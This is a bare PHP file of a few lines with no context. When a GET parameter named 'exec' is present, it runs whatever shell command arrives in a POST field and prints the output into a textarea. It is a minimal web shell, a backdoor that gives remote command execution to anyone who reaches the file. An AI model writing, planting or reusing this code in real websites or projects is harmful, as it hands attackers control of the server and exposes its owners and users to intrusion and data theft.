<?php
if (isset($_GET['exec'])) {
echo "<textarea rows=15 cols=114>";
echo shell_exec($_POST['command']);
echo "</textarea>";
exit;
}
?>